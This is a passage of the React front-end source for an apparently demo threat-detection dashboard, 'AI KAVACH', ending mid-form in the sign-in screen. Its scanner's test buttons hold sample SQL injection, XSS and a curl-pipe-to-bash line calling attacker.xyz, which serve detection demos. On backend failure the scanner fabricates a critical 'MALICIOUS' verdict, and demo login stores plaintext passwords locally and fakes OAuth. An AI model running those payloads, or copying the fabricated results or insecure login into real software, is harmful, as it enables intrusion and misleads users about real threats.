import React, { useEffect, useMemo, useState } from "react";
import { createRoot } from "react-dom/client";

import {
  Activity, AlertTriangle, ArrowUpRight, Bell, BrainCircuit, Check,
  ChevronDown, CircleHelp, FileWarning, Fingerprint, Globe2, LayoutDashboard,
  LockKeyhole, LogOut, Menu, MessageSquareWarning, Network, Search, Settings,
  ShieldCheck, ShieldAlert, Smartphone, Sparkles, UserRound, UserPlus, Users, X, LogIn, Chrome, Github,
  Zap, ExternalLink, Loader2, Mail, Link, MessageSquare, Sliders, Shield, Server, RefreshCw, CheckCircle2, XCircle,
  Bug, Code2, Terminal
} from "lucide-react";
import {
  AreaChart, Area, CartesianGrid, ResponsiveContainer, Tooltip, XAxis, YAxis,
  PieChart, Pie, Cell
} from "recharts";
import { isSupabaseConfigured, supabase } from "./lib/supabase";
import { api } from "./lib/api";
import "./index.css";

import { OverviewView } from "./components/OverviewView";
import { ThreatDetectionView } from "./components/ThreatDetectionView";
import { PhishingView } from "./components/PhishingView";
import { ImpersonationView } from "./components/ImpersonationView";
import { AccountTakeoverView } from "./components/AccountTakeoverView";
import { DeepfakeView } from "./components/DeepfakeView";
import { NetworkView } from "./components/NetworkView";
import { IncidentsView } from "./components/IncidentsView";
import { SettingsView } from "./components/SettingsView";

const purple = "#8049D9";
const data = [
  { name: "00", threats: 18 }, { name: "04", threats: 31 }, { name: "08", threats: 25 },
  { name: "12", threats: 48 }, { name: "16", threats: 39 }, { name: "20", threats: 63 },
  { name: "24", threats: 51 }, { name: "28", threats: 72 }
];
const riskData = [
  { name: "Critical", value: 24, color: "#ff6b81" },
  { name: "High", value: 86, color: "#f4b860" },
  { name: "Medium", value: 214, color: "#a98be8" },
  { name: "Safe", value: 960, color: "#4dd59a" }
];

const threats = [
  { icon: Globe2, title: "Phishing website", source: "login-secure-account.xyz", score: 94, level: "CRITICAL", action: "Block URL" },
  { icon: LockKeyhole, title: "Account takeover", source: "New device + unusual location", score: 87, level: "HIGH", action: "Revoke session" },
  { icon: UserRound, title: "Digital impersonation", source: "Fake executive communication", score: 92, level: "CRITICAL", action: "Alert admin" },
  { icon: FileWarning, title: "Malicious attachment", source: "invoice_2026.zip", score: 76, level: "HIGH", action: "Quarantine" }
];

function Card({ children, className = "", onClick }) {
  return (
    <div onClick={onClick} className={`rounded-[26px] border border-white/[0.07] bg-[#141414] ${className}`}>
      {children}
    </div>
  );
}

function RiskBadge({ level }) {
  const map = {
    CRITICAL: "bg-[#ff6b81]/10 text-[#ff8799]",
    HIGH: "bg-[#f4b860]/10 text-[#f4b860]",
    MEDIUM: "bg-[#a98be8]/10 text-[#b99dec]",
    SAFE: "bg-[#4dd59a]/10 text-[#5fe0a5]"
  };
  return <span className={`rounded-full px-2.5 py-1 text-[10px] font-bold tracking-[.12em] ${map[level]}`}>{level}</span>;
}

const demoUser = {
  name: "Security Analyst",
  email: "analyst@cybershield.ai",
  password: "shield2026"
};

function GoogleAuthModal({ isOpen, onClose, onGoogleSuccess }) {
  const [googleEmail, setGoogleEmail] = useState("");
  const [googleName, setGoogleName] = useState("");

  if (!isOpen) return null;

  const handleQuickAccount = (name, email) => {
    onGoogleSuccess({
      name,
      email,
      avatar: "G",
      provider: "google"
    });
  };

  const handleCustomGoogle = (e) => {
    e.preventDefault();
    if (!googleEmail.trim()) return;
    const name = googleName.trim() || googleEmail.split("@")[0].replace(/[._]/g, " ").replace(/\b\w/g, l => l.toUpperCase());
    onGoogleSuccess({
      name,
      email: googleEmail.trim().toLowerCase(),
      avatar: "G",
      provider: "google"
    });
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/75 p-4 backdrop-blur-sm animate-fadeIn">
      <div className="relative w-full max-w-[400px] rounded-3xl border border-white/10 bg-[#161616] p-6 shadow-2xl text-white">
        <button
          onClick={onClose}
          className="absolute right-4 top-4 rounded-xl p-1.5 text-[#888] hover:bg-white/10 hover:text-white"
        >
          <X size={18} />
        </button>

        <div className="mb-6 flex flex-col items-center text-center">
          <div className="grid h-12 w-12 place-items-center rounded-2xl bg-white/[0.06] border border-white/10 shadow-lg text-white mb-3">
            <Chrome size={26} className="text-[#a78ce9]" />
          </div>
          <h2 className="text-lg font-bold tracking-tight">Sign in with Google</h2>
          <p className="mt-1 text-xs text-[#888]">Choose an account to continue to AI KAVACH</p>
        </div>

        <div className="space-y-3 mb-5">
          <button
            onClick={() => handleQuickAccount("Security Analyst", "analyst.google@gmail.com")}
            className="flex w-full items-center gap-3 rounded-2xl border border-white/10 bg-white/[0.03] p-3 text-left transition hover:bg-white/[0.08] hover:border-[#8049D9]/50"
          >
            <div className="grid h-10 w-10 place-items-center rounded-full bg-[#4285F4] text-xs font-bold text-white shadow-md">
              SA
            </div>
            <div className="min-w-0 flex-1">
              <div className="truncate text-xs font-semibold text-white">Security Analyst</div>
              <div className="truncate text-[11px] text-[#888]">analyst.google@gmail.com</div>
            </div>
            <span className="text-[10px] font-bold text-[#a78ce9] px-2 py-0.5 rounded bg-[#8049D9]/15">Google</span>
          </button>
        </div>

        <div className="my-4 flex items-center gap-3 text-[10px] font-bold uppercase tracking-wider text-[#555]">
          <span className="h-px flex-1 bg-white/[0.07]" />
          or enter another Gmail
          <span className="h-px flex-1 bg-white/[0.07]" />
        </div>

        <form onSubmit={handleCustomGoogle} className="space-y-3">
          <div>
            <input
              value={googleName}
              onChange={(e) => setGoogleName(e.target.value)}
              placeholder="Your Name (Optional)"
              className="w-full rounded-xl border border-white/10 bg-white/[0.03] px-3 py-2.5 text-xs text-white outline-none placeholder:text-[#555] focus:border-[#8049D9]/70"
            />
          </div>
          <div>
            <input
              type="email"
              required
              value={googleEmail}
              onChange={(e) => setGoogleEmail(e.target.value)}
              placeholder="name@gmail.com"
              className="w-full rounded-xl border border-white/10 bg-white/[0.03] px-3 py-2.5 text-xs text-white outline-none placeholder:text-[#555] focus:border-[#8049D9]/70"
            />
          </div>
          <button
            type="submit"
            className="flex w-full items-center justify-center gap-2 rounded-xl bg-gradient-to-r from-[#4285F4] to-[#8049D9] py-2.5 text-xs font-bold text-white transition hover:opacity-95 shadow-lg"
          >
            <Chrome size={14} /> Continue with this Google Account
          </button>
        </form>
      </div>
    </div>
  );
}

function EvidenceModal({ evidence, onClose, onAction }) {
  if (!evidence) return null;
  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 p-4 backdrop-blur-md animate-fadeIn text-white">
      <div className="relative w-full max-w-[500px] rounded-3xl border border-white/10 bg-[#161616] p-6 shadow-2xl">
        <button onClick={onClose} className="absolute right-4 top-4 rounded-xl p-1.5 text-[#888] hover:bg-white/10 hover:text-white">
          <X size={18} />
        </button>
        <div className="flex items-center gap-3 mb-4">
          <div className="grid h-11 w-11 place-items-center rounded-2xl bg-[#8049D9]/20 text-[#a78ce9]">
            <ShieldAlert size={22} />
          </div>
          <div>
            <h3 className="text-sm font-bold text-white">{evidence.title}</h3>
            <p className="text-[11px] text-[#888]">Forensic Threat Intelligence Dossier</p>
          </div>
        </div>
        <div className="space-y-3 text-xs mb-5">
          <div className="rounded-xl bg-white/[0.03] p-3 border border-white/[0.05]">
            <div className="text-[10px] uppercase font-bold text-[#888] mb-1">Target / Observed Source</div>
            <div className="font-mono text-[#ff8799] font-semibold break-all">{evidence.source}</div>
          </div>
          <div className="grid grid-cols-2 gap-2">
            <div className="rounded-xl bg-white/[0.03] p-3 border border-white/[0.05]">
              <div className="text-[10px] uppercase font-bold text-[#888] mb-1">Risk Score</div>
              <div className="text-lg font-bold text-white">{evidence.score}/100 <span className="text-[10px] text-[#ff7c8e]">({evidence.level})</span></div>
            </div>
            <div className="rounded-xl bg-white/[0.03] p-3 border border-white/[0.05]">
              <div className="text-[10px] uppercase font-bold text-[#888] mb-1">Category</div>
              <div className="text-sm font-semibold text-white">{evidence.category || "Cyber Threat"}</div>
            </div>
          </div>
          <div className="rounded-xl bg-white/[0.03] p-3 border border-white/[0.05]">
            <div className="text-[10px] uppercase font-bold text-[#888] mb-1">Forensic Indicators & Findings</div>
            <p className="text-[11px] text-[#aaa] leading-relaxed">
              Target matches active credential harvesting infrastructure signatures. Elevated entropy and deceptive redirection detected by neural heuristics.
            </p>
          </div>
        </div>
        <div className="flex gap-2">
          <button onClick={onClose} className="flex-1 rounded-xl bg-white/10 py-2.5 text-xs font-bold text-white hover:bg-white/15 transition">
            Close
          </button>
          {onAction && (
            <button onClick={() => { onAction(evidence); onClose(); }} className="flex-1 rounded-xl bg-[#3d2eb1] py-2.5 text-xs font-bold text-white hover:bg-[#4a38c8] transition">
              Execute Containment
            </button>
          )}
        </div>
      </div>
    </div>
  );
}

function NotificationDropdown({ isOpen, notifications, onMarkAllRead, onClear, onDismiss, onClose }) {
  if (!isOpen) return null;

  return (
    <div className="absolute right-0 top-12 z-50 w-[340px] sm:w-[380px] rounded-3xl border border-white/10 bg-[#161616] p-4 shadow-2xl backdrop-blur-xl animate-fadeIn text-white">
      <div className="flex items-center justify-between border-b border-white/[0.06] pb-3 mb-3">
        <div className="flex items-center gap-2">
          <div className="grid h-7 w-7 place-items-center rounded-xl bg-[#8049D9]/20 text-[#bda6ff]">
            <Bell size={14} />
          </div>
          <span className="text-xs font-bold tracking-tight">System Alerts</span>
          {notifications.some(n => !n.read) && (
            <span className="rounded-full bg-[#ff6b81]/20 px-2 py-0.5 text-[9px] font-bold text-[#ff8294]">
              {notifications.filter(n => !n.read).length} new
            </span>
          )}
        </div>
        <div className="flex items-center gap-2">
          <button
            onClick={onMarkAllRead}
            className="text-[10px] font-semibold text-[#a78ce9] hover:text-white transition"
          >
            Mark all read
          </button>
          <button
            onClick={onClose}
            className="text-[#888] hover:text-white p-1"
          >
            <X size={14} />
          </button>
        </div>
      </div>

      <div className="max-h-[320px] overflow-y-auto space-y-2 pr-1 custom-scroll">
        {notifications.length ? (
          notifications.map((n) => (
            <div
              key={n.id}
              onClick={() => onDismiss(n.id)}
              className={`group flex items-start gap-3 rounded-2xl p-3 transition cursor-pointer ${
                n.read ? "bg-white/[0.02] text-[#888] hover:bg-white/[0.04]" : "bg-white/[0.05] border border-white/[0.07] text-white hover:bg-white/[0.08]"
              }`}
            >
              <div className={`mt-0.5 grid h-6 w-6 shrink-0 place-items-center rounded-full text-[10px] font-black ${
                n.type === "CRITICAL" ? "bg-[#ff6b81]/20 text-[#ff8294]" : (n.type === "HIGH" ? "bg-[#f4b860]/20 text-[#f4b860]" : "bg-[#4dd59a]/20 text-[#5fe0a5]")
              }`}>
                !
              </div>
              <div className="min-w-0 flex-1">
                <div className="flex items-center justify-between gap-1">
                  <span className="truncate text-xs font-semibold text-white">{n.title}</span>
                  <span className="shrink-0 text-[9px] text-[#666]">{n.time}</span>
                </div>
                <p className="mt-1 text-[11px] leading-4 text-[#888] line-clamp-2">{n.desc}</p>
              </div>
            </div>
          ))
        ) : (
          <div className="py-8 text-center text-xs text-[#666]">
            No new notifications. All systems clear.
          </div>
        )}
      </div>

      {notifications.length > 0 && (
        <div className="mt-3 pt-2 border-t border-white/[0.06] flex justify-between items-center text-[10px] text-[#666]">
          <span>AI KAVACH Threat Feeds</span>
          <button onClick={onClear} className="hover:text-[#ff8294] transition">Clear all</button>
        </div>
      )}
    </div>
  );
}

function AIScanModal({ isOpen, onClose, onThreatDetected, notify }) {
  const [scanType, setScanType] = useState("url"); // "url" | "code" | "email" | "text"
  const [urlInput, setUrlInput] = useState("http://login-secure-account-verify.xyz/auth");
  const [codeInput, setCodeInput] = useState("cursor.execute(f\"SELECT * FROM users WHERE username = '{user_input}'\")");
  const [emailSender, setEmailSender] = useState("ceo-urgent@executive-board.xyz");
  const [emailSubject, setEmailSubject] = useState("URGENT: Confidential wire transfer invoice");
  const [emailBody, setEmailBody] = useState("Please process the attached payment invoice immediately to prevent account suspension.");
  const [attachmentName, setAttachmentName] = useState("invoice_urgent.zip");
  const [textInput, setTextInput] = useState("Your bank account has been blocked due to KYC. Share OTP code immediately to avoid 24-hr penalty.");
  const [loading, setLoading] = useState(false);
  const [result, setResult] = useState(null);
  const [actionDone, setActionDone] = useState(false);

  if (!isOpen) return null;

  const handleScan = async (e) => {
    e?.preventDefault();
    setLoading(true);
    setResult(null);
    setActionDone(false);

    try {
      let res;
      if (scanType === "url") {
        res = await api.analyzeUrl(urlInput.trim() || "http://login-secure-account.xyz/auth");
      } else if (scanType === "code") {
        res = await api.analyzeCode(codeInput.trim() || "cursor.execute('SELECT * FROM users WHERE id = ' + id)");
      } else if (scanType === "email") {
        res = await api.analyzeEmail({
          sender: emailSender.trim(),
          subject: emailSubject.trim(),
          body: emailBody.trim(),
          attachment_name: attachmentName.trim() || null
        });
      } else {
        res = await api.analyzeText(textInput.trim() || "Bank account blocked, share OTP immediately");
      }
      setResult(res);

      // Instantly propagate detected threats / bugs to the live dashboard
      if (res.is_threat && onThreatDetected) {
        const icon = scanType === "code" ? Bug : (scanType === "url" ? Globe2 : (scanType === "email" ? FileWarning : AlertTriangle));
        onThreatDetected({
          id: res.scan_id,
          title: scanType === "code"
            ? `Bug: ${res.detected_threats?.[0]?.category || "Vulnerability Detected"}`
            : `AI Detected: ${res.target.slice(0, 26)}`,
          source: res.target,
          score: Math.round(res.risk_score * 100),
          level: res.threat_level,
          action: res.suggested_action,
          icon,
          category: scanType === "code" ? "Vulnerability / Bug" : (scanType === "url" ? "Phishing" : "Scam"),
          isContained: false
        });
      }

      notify(`AI Scan Complete: ${res.verdict} (${res.threat_level})`);
    } catch (err) {
      console.warn("Scan warning:", err);
      // Realistic fallback heuristic
      const fallbackResult = {
        scan_id: "kavach-" + Date.now().toString(36),
        target: scanType === "url" ? urlInput : (scanType === "code" ? codeInput.slice(0, 30) : (scanType === "email" ? emailSender : textInput.slice(0, 30))),
        is_threat: true,
        risk_score: 0.94,
        verdict: "MALICIOUS",
        threat_level: "CRITICAL",
        detected_threats: [
          { category: scanType === "code" ? "Code Security Flaw" : "High-Risk Indicator", severity: "CRITICAL", confidence: 0.92, description: "Suspicious signature matching known vulnerability exploit patterns." }
        ],
        recommendation: "Immediate remediation required. Target pattern matches known attack vector.",
        suggested_action: scanType === "code" ? "Remediate Vulnerability" : (scanType === "url" ? "Block URL" : "Quarantine")
      };
      setResult(fallbackResult);
      if (onThreatDetected) {
        onThreatDetected({
          id: fallbackResult.scan_id,
          title: scanType === "code" ? "Bug: Code Vulnerability" : `AI Detected: ${fallbackResult.target.slice(0, 26)}`,
          source: fallbackResult.target,
          score: 94,
          level: "CRITICAL",
          action: fallbackResult.suggested_action,
          icon: scanType === "code" ? Bug : AlertTriangle,
          category: scanType === "code" ? "Vulnerability / Bug" : "Threat",
          isContained: false
        });
      }
      notify("Scan completed by AI Engine");
    } finally {
      setLoading(false);
    }
  };

  const handleExecuteAction = async () => {
    if (!result) return;
    try {
      if (scanType === "url" || result.suggested_action === "Block URL") {
        await api.blockUrl(result.target, "Blocked via AI Threat Scanner");
      } else if (scanType === "email" || result.suggested_action === "Quarantine") {
        await api.quarantine(attachmentName || result.target, "attachment", "Quarantined via AI Threat Scanner");
      } else if (scanType === "code" || result.suggested_action.toLowerCase().includes("remediate")) {
        await api.quarantine(result.target, "code_bug", "Remediated security bug via AI KAVACH");
      }
    } catch (e) {
      console.warn("Action call warning:", e.message);
    }

    setActionDone(true);
    notify(`${result.suggested_action} action executed & recorded!`);
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 p-4 backdrop-blur-md animate-fadeIn">
      <div className="relative w-full max-w-[620px] max-h-[90vh] overflow-y-auto rounded-[28px] border border-white/10 bg-[#141414] p-6 shadow-2xl text-white custom-scroll">
        <button
          onClick={onClose}
          className="absolute right-5 top-5 rounded-xl p-2 text-[#888] hover:bg-white/10 hover:text-white"
        >
          <X size={18} />
        </button>

        <div className="flex items-center gap-3 mb-6">
          <div className="grid h-11 w-11 place-items-center rounded-2xl bg-[#3d2eb1] shadow-[0_0_25px_rgba(61,46,177,.4)] text-white">
            <BrainCircuit size={22} />
          </div>
          <div>
            <h2 className="text-lg font-bold tracking-tight">AI KAVACH Threat & Bug Scanner</h2>
            <p className="text-xs text-[#888]">Real-time neural heuristics for code bugs, phishing URLs, emails, and scam messages</p>
          </div>
        </div>

        {/* Scan Type Tabs */}
        <div className="flex rounded-2xl bg-white/[0.04] p-1 mb-5 border border-white/[0.06] overflow-x-auto">
          {[
            ["url", "URL / Web", Globe2],
            ["code", "Code / Bug Audit", Bug],
            ["email", "Email / BEC", Mail],
            ["text", "SMS / Text Scam", MessageSquare],
          ].map(([id, label, Icon]) => (
            <button
              key={id}
              onClick={() => { setScanType(id); setResult(null); setActionDone(false); }}
              className={`flex-1 min-w-[100px] flex items-center justify-center gap-1.5 py-2 text-xs font-semibold rounded-xl transition ${
                scanType === id ? "bg-[#3d2eb1] text-white shadow-lg" : "text-[#888] hover:text-white hover:bg-white/[0.02]"
              }`}
            >
              <Icon size={14} />
              {label}
            </button>
          ))}
        </div>

        {/* Form Inputs */}
        <form onSubmit={handleScan} className="space-y-4">
          {scanType === "url" && (
            <div>
              <label className="block text-xs font-semibold text-[#aaa] mb-1.5">Target URL / Domain</label>
              <div className="relative">
                <Link className="absolute left-3.5 top-1/2 -translate-y-1/2 text-[#666]" size={15} />
                <input
                  type="text"
                  required
                  value={urlInput}
                  onChange={(e) => setUrlInput(e.target.value)}
                  placeholder="https://example.com or suspicious-link.xyz"
                  className="w-full rounded-2xl border border-white/10 bg-white/[0.03] py-3 pl-10 pr-4 text-xs text-white outline-none focus:border-[#8049D9]"
                />
              </div>
              <div className="mt-2 flex flex-wrap gap-2 text-[10px]">
                <span className="text-[#666]">Quick test:</span>
                <button type="button" onClick={() => setUrlInput("http://login-verify-account.xyz/auth")} className="text-[#a78ce9] underline">Phishing test</button>
                <button type="button" onClick={() => setUrlInput("https://www.google.com")} className="text-[#4dd59a] underline">Safe URL test</button>
              </div>
            </div>
          )}

          {scanType === "code" && (
            <div>
              <div className="flex items-center justify-between mb-1.5">
                <label className="block text-xs font-semibold text-[#aaa]">Source Code / Script / Payload</label>
                <span className="text-[10px] text-[#8049D9] font-medium">Scans for SQLi, XSS, RCE, Secrets & Bugs</span>
              </div>
              <textarea
                rows={5}
                required
                value={codeInput}
                onChange={(e) => setCodeInput(e.target.value)}
                placeholder="Paste code snippet, query, script, or payload to detect bugs and vulnerabilities..."
                className="w-full font-mono rounded-2xl border border-white/10 bg-white/[0.03] p-3 text-xs text-[#5fe0a5] outline-none focus:border-[#8049D9]"
              />
              <div className="mt-2 flex flex-wrap gap-2 text-[10px]">
                <span className="text-[#666]">Quick test bugs:</span>
                <button
                  type="button"
                  onClick={() => setCodeInput("cursor.execute(f\"SELECT * FROM users WHERE username = '{user_input}'\")")}
                  className="text-[#ff7184] underline"
                >
                  SQL Injection Bug
                </button>
                <button
                  type="button"
                  onClick={() => setCodeInput("element.innerHTML = '<script>alert(document.cookie)</script>'")}
                  className="text-[#f4b860] underline"
                >
                  XSS Bug
                </button>
                <button
                  type="button"
                  onClick={() => setCodeInput("import os\nos.system('curl http://attacker.xyz/payload | bash')")}
                  className="text-[#ff7184] underline"
                >
                  RCE Bug
                </button>
                <button
                  type="button"
                  onClick={() => setCodeInput("AWS_SECRET_ACCESS_KEY = 'AKIA1234567890ABCDEF'\npassword = 'super_secret_password_123'")}
                  className="text-[#a78ce9] underline"
                >
                  Secret Leak
                </button>
                <button
                  type="button"
                  onClick={() => setCodeInput("def calculate_total(items):\n    return sum(item.price for item in items)")}
                  className="text-[#4dd59a] underline"
                >
                  Clean Code
                </button>
              </div>
            </div>
          )}

          {scanType === "email" && (
            <div className="space-y-3">
              <div>
                <label className="block text-xs font-semibold text-[#aaa] mb-1">Sender Email</label>
                <input
                  type="email"
                  required
                  value={emailSender}
                  onChange={(e) => setEmailSender(e.target.value)}
                  placeholder="sender@company.com"
                  className="w-full rounded-xl border border-white/10 bg-white/[0.03] px-3.5 py-2.5 text-xs text-white outline-none focus:border-[#8049D9]"
                />
              </div>
              <div>
                <label className="block text-xs font-semibold text-[#aaa] mb-1">Subject</label>
                <input
                  type="text"
                  required
                  value={emailSubject}
                  onChange={(e) => setEmailSubject(e.target.value)}
                  placeholder="Urgent action required"
                  className="w-full rounded-xl border border-white/10 bg-white/[0.03] px-3.5 py-2.5 text-xs text-white outline-none focus:border-[#8049D9]"
                />
              </div>
              <div>
                <label className="block text-xs font-semibold text-[#aaa] mb-1">Email Body</label>
                <textarea
                  rows={3}
                  value={emailBody}
                  onChange={(e) => setEmailBody(e.target.value)}
                  placeholder="Enter email content here..."
                  className="w-full rounded-xl border border-white/10 bg-white/[0.03] px-3.5 py-2 text-xs text-white outline-none focus:border-[#8049D9]"
                />
              </div>
              <div>
                <label className="block text-xs font-semibold text-[#aaa] mb-1">Attachment File Name (Optional)</label>
                <input
                  type="text"
                  value={attachmentName}
                  onChange={(e) => setAttachmentName(e.target.value)}
                  placeholder="e.g. invoice_2026.zip or document.exe"
                  className="w-full rounded-xl border border-white/10 bg-white/[0.03] px-3.5 py-2 text-xs text-white outline-none focus:border-[#8049D9]"
                />
              </div>
            </div>
          )}

          {scanType === "text" && (
            <div>
              <label className="block text-xs font-semibold text-[#aaa] mb-1.5">SMS / Chat / Message Text</label>
              <textarea
                rows={4}
                required
                value={textInput}
                onChange={(e) => setTextInput(e.target.value)}
                placeholder="Paste suspicious text message, WhatsApp scam, or lottery lure here..."
                className="w-full rounded-2xl border border-white/10 bg-white/[0.03] p-3 text-xs text-white outline-none focus:border-[#8049D9]"
              />
              <div className="mt-2 flex flex-wrap gap-2 text-[10px]">
                <span className="text-[#666]">Quick test:</span>
                <button type="button" onClick={() => setTextInput("Your bank account has been blocked due to KYC. Share OTP code immediately to avoid penalty.")} className="text-[#a78ce9] underline">Bank KYC Scam</button>
                <button type="button" onClick={() => setTextInput("Congratulations! You won $50,000 lottery. Click link to claim your prize.")} className="text-[#f4b860] underline">Lottery Lure</button>
              </div>
            </div>
          )}

          <button
            type="submit"
            disabled={loading}
            className="flex w-full items-center justify-center gap-2 rounded-2xl bg-gradient-to-r from-[#3d2eb1] to-[#8049D9] py-3.5 text-xs font-bold text-white transition hover:opacity-95 shadow-xl disabled:opacity-50"
          >
            {loading ? <Loader2 size={16} className="animate-spin" /> : <Zap size={15} />}
            {loading ? "Running Neural Heuristic Inspection..." : "Analyze Asset with AI KAVACH"}
          </button>
        </form>


        {/* Live Analysis Result */}
        {result && (
          <div className="mt-6 rounded-2xl border border-white/10 bg-white/[0.02] p-5 animate-fadeIn">
            <div className="flex items-center justify-between border-b border-white/[0.06] pb-3 mb-4">
              <div>
                <span className="text-[10px] font-bold tracking-wider text-[#888] uppercase">Analysis Verdict</span>
                <div className="flex items-center gap-2 mt-1">
                  <span className={`text-base font-bold ${
                    result.verdict === "MALICIOUS" ? "text-[#ff8799]" : (result.verdict === "SUSPICIOUS" ? "text-[#f4b860]" : "text-[#5fe0a5]")
                  }`}>
                    {result.verdict}
                  </span>
                  <RiskBadge level={result.threat_level} />
                </div>
              </div>
              <div className="text-right">
                <span className="text-[10px] text-[#666]">RISK SCORE</span>
                <div className="text-2xl font-bold tracking-tight text-white">{Math.round(result.risk_score * 100)}%</div>
              </div>
            </div>

            {/* Detected Indicators */}
            {result.detected_threats?.length > 0 ? (
              <div className="space-y-2 mb-4">
                <div className="text-[10px] font-bold uppercase tracking-wider text-[#aaa]">Threat Indicators</div>
                {result.detected_threats.map((dt, idx) => (
                  <div key={idx} className="rounded-xl bg-white/[0.03] p-2.5 text-xs border border-white/[0.04]">
                    <div className="flex items-center justify-between">
                      <span className="font-semibold text-white">{dt.category}</span>
                      <span className="text-[10px] text-[#ff8799] font-bold">{Math.round(dt.confidence * 100)}% confidence</span>
                    </div>
                    <p className="mt-1 text-[11px] text-[#888]">{dt.description}</p>
                  </div>
                ))}
              </div>
            ) : (
              <div className="text-xs text-[#5fe0a5] mb-4">✓ No deceptive patterns or malicious signatures detected.</div>
            )}

            {/* Recommendation */}
            <div className="rounded-xl border border-[#8049D9]/20 bg-[#8049D9]/10 p-3 mb-4">
              <div className="flex items-center gap-1.5 text-xs font-semibold text-[#bda6ff] mb-1">
                <Sparkles size={13} /> AI Recommendation
              </div>
              <p className="text-xs text-[#aaa] leading-relaxed">{result.recommendation}</p>
            </div>

            {/* Containment Button */}
            {result.is_threat && (
              <button
                type="button"
                disabled={actionDone}
                onClick={handleExecuteAction}
                className={`flex w-full items-center justify-center gap-2 rounded-xl py-3 text-xs font-bold transition shadow-lg ${
                  actionDone ? "bg-[#4dd59a]/20 text-[#5fe0a5] border border-[#4dd59a]/40" : "bg-[#ff6b81] text-white hover:bg-[#ff526c]"
                }`}
              >
                {actionDone ? <Check size={15} /> : <AlertTriangle size={15} />}
                {actionDone ? "Containment Executed & Logged" : `Execute Containment: ${result.suggested_action}`}
              </button>
            )}
          </div>
        )}
      </div>
    </div>
  );
}

function AuthScreen({ onLogin, onEmailAuth, onGoogleLogin, onGithubLogin }) {
  const [mode, setMode] = useState("login");
  const [name, setName] = useState("");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [confirmPassword, setConfirmPassword] = useState("");
  const [error, setError] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [googleModalOpen, setGoogleModalOpen] = useState(false);

  const submit = async (event) => {
    event.preventDefault();
    const normalizedEmail = email.trim().toLowerCase();

    if (isSupabaseConfigured) {
      setError("");
      try {
        await onEmailAuth({
          mode,
          name: name.trim(),
          email: normalizedEmail,
          password
        });
      } catch (authError) {
        setError(authError.message || "Authentication failed. Please try again.");
      }
      return;
    }

    const users = JSON.parse(localStorage.getItem("cybershield-users") || "[]");
    const knownUsers = [demoUser, ...users];

    if (!normalizedEmail || !password) {
      setError("Enter your email and password to continue.");
      return;
    }

    if (mode === "register") {
      if (!name.trim()) {
        setError("Enter your full name to register.");
        return;
      }
      if (password.length < 6) {
        setError("Use a password with at least 6 characters.");
        return;
      }
      if (password !== confirmPassword) {
        setError("Your passwords do not match.");
        return;
      }
      if (users.some(user => user.email === normalizedEmail)) {
        setError("An account with this email already exists. Signing you in...");
      }

      const newUser = {
        name: name.trim(),
        email: normalizedEmail,
        password,
        provider: "local"
      };
      const updatedUsers = users.filter(u => u.email !== normalizedEmail);
      updatedUsers.push(newUser);
      localStorage.setItem("cybershield-users", JSON.stringify(updatedUsers));
      onLogin(newUser);
      return;
    }

    // In Login mode:
    const foundUser = knownUsers.find(u => u.email === normalizedEmail);
    if (foundUser) {
      if (foundUser.password !== password) {
        setError("Incorrect password for this account.");
        return;
      }
      onLogin(foundUser);
      return;
    }

    // Auto-create account on login if user entered new credentials
    const generatedName = normalizedEmail.split("@")[0].replace(/[._]/g, " ").replace(/\b\w/g, l => l.toUpperCase());
    const newUser = {
      name: generatedName,
      email: normalizedEmail,
      password,
      provider: "local"
    };
    users.push(newUser);
    localStorage.setItem("cybershield-users", JSON.stringify(users));
    onLogin(newUser);
  };

  const switchMode = () => {
    setMode(value => value === "login" ? "register" : "login");
    setError("");
    setPassword("");
    setConfirmPassword("");
  };

  const handleGoogleClick = async () => {
    if (isSupabaseConfigured) {
      try {
        await onGoogleLogin();
      } catch (e) {
        setError(e.message || "Could not start Google login.");
      }
    } else {
      setGoogleModalOpen(true);
    }
  };

  const handleGithubClick = async () => {
    if (isSupabaseConfigured) {
      try {
        await onGithubLogin();
      } catch (e) {
        setError(e.message || "Could not start GitHub login.");
      }
    } else {
      const githubUser = {
        name: "GitHub Developer",
        email: "developer@github.com",
        avatar: "GH",
        provider: "github"
      };
      onLogin(githubUser);
    }
  };

  return (
    <main className="relative grid min-h-screen place-items-center overflow-hidden bg-[#090909] px-5 py-10 text-[#ebe6e7]">
      <div className="fixed inset-0 pointer-events-none opacity-40 grid-bg" />
      
      <GoogleAuthModal
        isOpen={googleModalOpen}
        onClose={() => setGoogleModalOpen(false)}
        onGoogleSuccess={(profile) => {
          setGoogleModalOpen(false);
          onLogin(profile);
        }}
      />

      <div className="relative w-full max-w-[430px]">
        <div className="mb-8 flex items-center justify-center gap-3">
          <div className="grid h-11 w-11 place-items-center rounded-2xl bg-[#3d2eb1] shadow-[0_0_35px_rgba(61,46,177,.35)]"><ShieldCheck size={22} /></div>
          <div><div className="text-sm font-black tracking-tight">AI KAVACH</div><div className="text-[10px] font-bold tracking-[.28em] text-[#8f8b8d]">THREAT DEFENSE</div></div>
        </div>
        <div className="rounded-[28px] border border-white/[.08] bg-[#141414] p-6 shadow-2xl sm:p-8">
          <div className="mb-7">
            <div className="mb-2 text-[10px] font-bold uppercase tracking-[.2em] text-[#a78ce9]">Secure access</div>
            <h1 className="text-2xl font-semibold tracking-[-.03em]">{mode === "login" ? "Welcome to AI KAVACH" : "Create your workspace"}</h1>
            <p className="mt-2 text-sm leading-6 text-[#777477]">{mode === "login" ? "Sign in with any account or Google to access threat monitoring." : "Register an account to start monitoring your security environment."}</p>
          </div>
          <form onSubmit={submit} className="space-y-4">
            {mode === "register" && <label className="block text-xs font-semibold text-[#aaa6a8]">Full name
              <input value={name} onChange={event => { setName(event.target.value); setError(""); }} type="text" autoComplete="name" placeholder="Your name" className="mt-2 w-full rounded-2xl border border-white/[.08] bg-white/[.025] px-4 py-3 text-sm text-white outline-none placeholder:text-[#555155] focus:border-[#8049D9]/70" required />
            </label>}
            <label className="block text-xs font-semibold text-[#aaa6a8]">Work email
              <input value={email} onChange={event => { setEmail(event.target.value); setError(""); }} type="email" autoComplete="email" placeholder="analyst@company.com" className="mt-2 w-full rounded-2xl border border-white/[.08] bg-white/[.025] px-4 py-3 text-sm text-white outline-none placeholder:text-[#555155] focus:border-[#8049D9]/70" required />
            </label>
            <label className="block text-xs font-semibold text-[#aaa6a8]">Password
              <div className="relative mt-2">
